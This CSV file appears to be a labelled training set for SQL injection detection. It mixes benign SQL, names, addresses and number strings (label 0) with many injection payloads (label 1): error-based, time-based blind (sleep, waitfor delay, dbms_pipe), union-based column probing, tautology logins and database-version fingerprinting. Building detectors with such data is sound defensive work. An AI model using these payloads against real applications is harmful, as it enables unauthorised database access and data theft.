Sentence,Label
"1"" )  as fkco where 8877 = 8877 or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) --",1
 select * from users where id = 1 <@$ or 1 = 1 -- 1,1
"1"" and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1
SELECT * FROM major WHERE sharp NOT BETWEEN 'bear' AND 'occasionally',0
SELECT * FROM strong WHERE NOT swam = 'from'  AND NOT deal = 'cloth',0
SELECT rose ( s FROM own RIGHT JOIN,0
SELECT COUNT ( climate )  FROM attack,0
SELECT * FROM theory FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM something,0
arancn,0
"1%'  )  )   )  or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
5659,0
nassiet.birkin@cienciapolicial.gl,0
jasmann,0
1%' and 9127 = 7687--,1
"1' )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  ",1
SELECT * FROM lamp WHERE son LIKE '%ourselves%',0
3880,0
"1'  )   where 6056  =  6056 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1
5400000000000000,0
1160000000000000,0
"1%""   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  ""%""  =  """,1
SELECT MIN ( practice )  AS airplane FROM well,0
donhierro,0
"1""  )  )   )  or sleep ( 5 )  and   (  (   ( ""hdis"" like ""hdis",1
wicht,0
1529,0
"1"" )  union all select null,null,null,null,null,null--",1
pdf 201704/00001491531745287,0
"1"" )  or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
"1 )  and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 ) ",1
7136610000000000,0
45025499d,0
SELECT * FROM summer 3,0
hermine@943.mw,0
frydtberg@archivodeimagenes.cat,0
SELECT * FROM kids ORDER BY circle,0
"1""  )   where 2633  =  2633 union all select null,null,null,null#",1
0ap7r344c6,0
"select * from generate_series  (  2382,2382,case when   (  2382  =  4352  )   then 1 else 0 end  )   limit 1--",1
steele,0
"   SELECT support, our+ ', ' + political+ ' ' + fierce+ ', ' + shallow AS far  FROM again",0
SELECT COUNT ( DISTINCT wash )  FROM steep,0
"1'   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   'rnyb'  =  'rnyb",1
SELECT COUNT ( DISTINCT rich )  FROM him,0
"1'+  (  select 'yzxc' where 5230  =  5230   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   +'",1
SELECT arrange ( s )  FROM oldest SELECT know ( s ) ,0
"1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '%'  =  '",1
SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_button_2_text' LIMIT 1,0
braddell@cincocolores.cat,0
quijar,0
bianchetti@zafranet.se,0
"1"" where 8016  =  8016",1
"1""   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""buwe""  =  ""buwe",1
valdiviezo montull,0
04458,0
"san basilio, 142 12?h",0
-8652'  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,1
"   SELECT COUNT ( average ) , sport FROM slipped BY cowboy",0
SELECT * FROM jar WHERE birds BETWEEN 'medicine' AND 'loud',0
" Kendrick Johnson , Valdosta , Ga ",0
DELETE FROM yes WHERE sheep = 'porch',0
rattanap,0
"1   )    )    as mgvw where 4923  =  4923 union all select null,null,null,null--",1
"-4764""  )  )   or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (  ""dfvz"" like ""dfvz",1
1' )  rlike  ( select  ( case when  ( 9308 = 2540 )  then 1 else 0x28 end  )  )   and  ( 'rghd' = 'rghd,1
select case when 8237 = 9948 then 1 else null end--,1
SELECT * FROM gray,0
SELECT TOP 3 * FROM carefully,0
46183,0
"1""   )    )    rlike sleep  (  5  )   and    (    (   ""fzlr""  =  ""fzlr",1
"1'+  (  select 'mikf' where 5814  =  5814 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
" The trains , coming central station , must also sufficiently slowed threat collision ",0
"   SELECT entirely, bare+ ', ' + ten+ ' ' + title+ ', ' + shirt AS evening  FROM planning",0
' group by userid having 1 = 1--,1
dueas cristaldo,0
"1%'  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and '%' = '",1
SELECT * FROM  ( SELECT drove FROM slope ) ,0
"1""   )    )    union all select null,null,null,null,null,null,null,null#",1
-4248 where 3288 = 3288 or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --,1
"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",1
"1 where 9083 = 9083 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1
"1   )    )     )   union all select null,null,null,null,null,null,null--",1
fanny,0
"select pg_sleep ( 5 )  and ""zhsc"" = ""zhsc",1
1'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'nfix'  =  'nfix,1
6531431919171426,0
anand,0
1 where 3802 = 3802 and 2006 = 2006,1
1%' )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #,1
suau,0
tenesaca chaves,0
"1'  )  )   as hmyc where 6732 = 6732 and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  --",1
verbosidad,0
flavio,0
SELECT * FROM stood WHERE NOT early = 'although'  AND NOT dollar = 'sight',0
7580,0
ob1et7nt9,0
baff@enhierro.com.ec,0
SELECT * FROM length WHERE NOT pen = 'none'  AND NOT case = 'powerful',0
64733615t,0
" Their motto , large billboard stated &quot; We unfinished buildings &quot; ",0
SELECT COUNT ( share ) FROM apple,0
"1  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  ",1
5abiana,0
"   SELECT report, rod, shownFROM speech WHERE bell  IS NOT NULL",0
"callejon giron 124,",0
"   SELECT zulu,nose,rising,move,leader     (  (  courage JOIN did ON desk.shown =  glad.wheat )   INNER JOIN somethingON Orders.shall =  central.developID ) ",0
1%'  )  )   )  and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #,1
 He coined term &quot; gender identity &quot; argued social environmental cues -- parents raised child -- interacted child &apos;s genes hormones shape whether person identified male female ,0
"INSERT INTO weight  ( remain, select, distant )  VALUES  ( 'shut', 'create', 'tribe' )  ",0
6511290000000000,0
sabionda,0
"  SELECT happilyID AS ID, market AS mine FROM rock",0
9859982019470735,0
SELECT growth ( s )  FROM market,0
gorfine,0
"1%' )  union all select null,null,null,null,null,null,null,null,null--",1
nab,0
"1"" )  as wxea where 6394 = 6394 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1
"-2920""  )  )   as zdgv where 9702 = 9702 or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --",1
SELECT AVG ( from )  FROM farmer  SELECT SUM ( thirty ) ,0
"1'+  (  select vxax where 9036  =  9036 and elt  (  1210  =  1210,sleep  (  5   )    )     )  +'",1
"-2125""  )  )   or 8571 = 8571--",1
"-8844""  )  )   )  or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1
select * from users where id  =  1 +$ . or 1  =  1 -- 1,1
"-1920'   )    )     )   union all select 1424,1424,1424,1424,1424,1424,1424,1424,1424,1424#",1
1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
05141,0
serrano,0
"1'  )   where 9304  =  9304 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT AVG ( Price ) FROM hand,0
SELECT simple ( s ) FROM court INNER JOIN,0
"1 and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
SELECT * FROM atomic WHERE machinery = 'load'  AND  ( give = 'view' OR toy = 'amount' ) ,0
"-3364%""  )  )   )  union all select 5464--",1
" &quot; It added , &quot; inspection activities currently planned ",0
1   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  6062  =  6062,1
alfi,0
c358ra,0
spaeth@directoriogratuito.kr,0
"1   )    )     )   union all select null,null,null,null--",1
"1""  )  )   )  and 9198 = 9198--",1
1' )  waitfor delay '0:0:5' and  ( 'fpnh' = 'fpnh,1
" select * from users where id = '1' union select 1""!"",banner from v$version where rownum = 1 -- 1'",1
"1' and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"-8490  )  )   union all select 6910,6910,6910,6910,6910,6910#",1
 In every work genius recognize rejected thoughts: come back us certain alienated majesty,0
"  UPDATE explore SET section =  'lot', City =  'forgot' WHERE equator =  eaten",0
entolar,0
38623329g,0
"1'   )    )    as sojl where 8710  =  8710 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
"1"" and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) ",1
berriz,0
SELECT * FROM front WHERE wise = 'earn',0
1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  'eqfh'  =  'eqfh,1
jarel,0
1'   )    )     )   and 7401  =  9838#,1
jubinvil,0
2780,0
17132,0
"  SELECT richID AS ID, remain AS thumb FROM swimming",0
calafell palmieri,0
castell d'empries,0
salicilato,0
08297,0
"1%""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""%""  =  """,1
"1  )   and elt  (  3138  =  1817,1817  )  ",1
7022174850420090,0
61947998m,0
lupin colombo,0
"1""  )   where 7452  =  7452",1
dept.,0
"1 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  -- xsob",1
trauberg_lion@viscotek.pl,0
"INSERT INTO solar ( army, rise, youth, course, select, electricity )  VALUES  ( 'exist', 'anywhere'. product', 'near', 'market', 'section', 'however' )  ",0
DELETE FROM port WHERE just = 'one',0
"admin"" or ""1"" = ""1""/*",1
"1 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
-5336' )  where 8691 = 8691 or 3608 = 1887--,1
"-1559 union all select 3985,3985,3985,3985#",1
amoeiro,0
ribadumia,0
" SELECT * FROM police ORDER BY forward ASC, than DESC",0
"select dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  70  )  ||chr  (  106  )  ||chr  (  78  )  ,5  )   from dual--",1
select   (  case when   (  3414  =  8741  )   then 3414 else 3414*  (  select 3414 from information_schema.character_sets  )   end  )  #,1
0908272174397466,0
bancroft@lawn.mc,0
ace673,0
"1"" )  as ivkw where 4218 = 4218 union all select null--",1
SELECT COUNT ( nearly ) FROM range,0
corcoy augu,0
1  )   where 4573  =  4573,1
"-3102 )  union all select 6707,6707,6707,6707--",1
SELECT AVG ( ear ) FROM school SELECT SUM ( heat ) ,0
 &quot; Many German executives argue latest reports simply confirmation already knew: powerful states want steal prized secrets data must therefore guarded costs ,0
"-4927'   )    )    union all select 1924,1924#",1
" The planned covering dilapidated house rear plot permitted safety reasons , premises risk collapsing ",0
li74re04,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 290914 )  ORDER BY meta_id ASC",0
bols,0
"1'||  (  select 'kgjk' where 3530  =  3530 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
backy@legami.tz,0
"1 )  as adzj where 5575 = 5575 or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
75512816k,0
"1' )  and make_set ( 7187 = 4625,4625 )  and  ( 'diai' like 'diai",1
 (  select   (  case when   (  1421  =  1421  )   then 1 else 1421*  (  select 1421 from master..sysdatabases  )   end   )    ) ,1
"   SELECT couple, moment, veryFROM bean WHERE outside  IS NOT NULL",0
SELECT * FROM mirror,0
 They require clear pathways order preserve species ,0
elantxobe,0
SELECT * FROM ten FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM draw,0
cubia cajahuanca,0
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and   (  (  'frpo' like 'frpo",1
resello,0
SELECT * FROM market WHERE beautiful = 'thus'  OR crowd = 'is',0
"SELECT DATE_SUB ( ""2017-06-15 09:34:21"", INTERVAL 15 MINUTE ) ;",0
"1' or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ",1
canino,0
SELECT * FROM bright WHERE wooden = 'fresh'  AND City = 'canal',0
carrer rusc 29,0
SELECT * FROM general WHERE minute LIKE '%stairs%',0
SELECT * FROM adjective FETCH FIRST 50 PERCENT ROWS ONLY,0
08611,0
a,1
 or 1 in  ( select @@version ) --,1
reinald,0
SELECT * FROM began,0
"1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'ayjb' like 'ayjb",1
DELETE FROM stiff,0
22,0
SELECT * FROM pen WHERE straight = 'deep'  OR eventually = 'its',0
1   )    )    as wwkw where 7289  =  7289 and 7533  =  7533--,1
1  )   as qort where 1554  =  1554,1
uribitarte 72 13?g,0
"1'  )  )   )  and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (   ( 'rfln' = 'rfln",1
carcabuey,0
"-6809""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""nfnf""  =  ""nfnf",1
daimiel,0
"  SELECT * FROM suppose WHERE threw IN  ( 'student', 'rope', 'means' )  ",0
mettrey,0
"  UPDATE brought SET again =  'center', City =  'father' WHERE tongue =  grown",0
clooney,0
1'  )   as zmvn where 2887  =  2887 union all select null--,1
pelez bastus,0
1 where 3502  =  3502 order by 1--,1
1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
"1  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",1
65165479q,0
 select * from users where id = '1'   or 1 = 1 -- 1',1
0x770061006900740066006F0072002000640065006C00 ...,1
clavering@pinturasultravioleta.pro,0
barranco,0
kaneshir,0
"-9795  )   as wrgs where 5427  =  5427 union all select 5427,5427,5427,5427,5427,5427--",1
SELECT Count ( * )  AS column,0
asimismo,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and '%'  =  '",1
-3246%' union all select 4012#,1
SELECT AVG ( against )  FROM caught  SELECT SUM ( pull ) ,0
SELECT * FROM tea  WHERE gulf NOT LIKE '[explanation]%',0
SELECT MIN ( not )  AS compound FROM bar,0
SELECT * FROM branch WHERE result = 'window' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM  ( SELECT life FROM paid ) ,0
cel65co,0
SELECT * FROM wp_posts WHERE ID  =  28638 LIMIT 1,0
 ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1931 = 1931 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )  ,1
"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
"  SELECT * FROM trace WHERE slave NOT IN  ( 'light', 'tax', 'bite' )  ",0
-9148 )  where 2027 = 2027 or 8571 = 8571--,1
72622550g,0
2993,0
eric3@familiamarino.sh,0
"1  )  )   as berd where 5803 = 5803 union all select null,null,null,null,null,null,null--",1
4396,0
47882,0
"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'ichh' like 'ichh",1
kesling8,0
"1'  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
-8684' where 9820 = 9820 or 6844 = 5105,1
3ube3a,0
"1"" )  as lipa where 3450 = 3450 and make_set ( 8403 = 8403,8899 ) --",1
"INSERT INTO grow ( shall, kill, paragraph, spirit, recall, if )  VALUES  ( 'goose', 'speed'. spent', 'lesson', 'season', 'many', 'salmon' )  ",0
SELECT * FROM arm WHERE tongue = 'divide' FETCH FIRST 3 ROWS ONLY,0
0932689894259111,0
"-6632 )  union all select 4073,4073,4073,4073,4073,4073,4073,4073--",1
"1""   )    )    and 5421  =  4804--",1
schuett,0
"1"" )  as dien where 4022 = 4022",1
SELECT map FROM will UNION ALL SELECT accurate FROM wrapped ORDER BY grew,0
"   SELECT tip, half, drivingFROM physical WHERE usual  IS NOT NULL",0
benfield@chuecafamily.gs,0
"1'+ ( select 'fxhh' where 2571 = 2571 union all select null,null,null,null,null,null,null--",1
"-9886%'  )  )   )  union all select 5191,5191,5191,5191,5191,5191,5191--",1
"1'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'ijyi'  =  'ijyi",1
"1' )  where 3271 = 3271 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",1
SELECT forgotten ( s )  FROM better FULL OUTER JOIN,0
 Today &apos;s electronic devices generally emit much lower power radio transmissions previous generations devices ,0
"c/ barranc de jonqueres, 186,",0
" SELECT column_name ( s )  FROM ago,alike",0
hoog,0
maracaja@telogis.ad,0
"1""  )  )   and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (  ""bfko"" = ""bfko",1
"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'aicu'  =  'aicu",1
ep9scopologio,0
ba1uetazo,0
1   )    )    as ztcn where 1043  =  1043 and 6305  =  5785--,1
SELECT AVG ( excited ) FROM industry SELECT SUM ( mouse ) ,0
SELECT AVG ( hidden ) FROM too SELECT SUM ( thumb ) ,0
 or a = a--,1
"calle polvorin, 117,",0
sabio,0
antonio ulloa 6 6?d,0
49645694x,0
SELECT * FROM look FETCH FIRST 50 PERCENT ROWS ONLY,0
1'||  (  select 'gdzt' where 4950  =  4950,1
" In October , number jobless fell slightly 22 , total 1,307 ",0
"-5313""  )  )   )  union all select 9189,9189,9189,9189,9189,9189,9189,9189--",1
"joyosa, la",0
SELECT AVG ( Price ) FROM chapter,0
34120,0
"1' where 4417 = 4417 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",1
"isabelita ruiz, 31",0
"1""  )   where 6823  =  6823 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
" SELECT * FROM soldier ORDER BY government ASC, chamber DESC",0
degollar,0
"1%'  )  )   )  union all select null,null#",1
" select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",1
1721278325772936,0
rudolf,0
earvin,0
SELECT * FROM desk FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM essential,0
1596,0
9.66866E+015,0
jahu,0
"-8894%""   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   ""%""  =  """,1
"INSERT INTO doll ( every, dull, strange, seven, charge, political )  VALUES  ( 'addition', 'express'. wall', 'corner', 'taken', 'darkness', 'activity' )  ",0
"   SELECT COUNT ( along ) , operation FROM seems BY middle",0
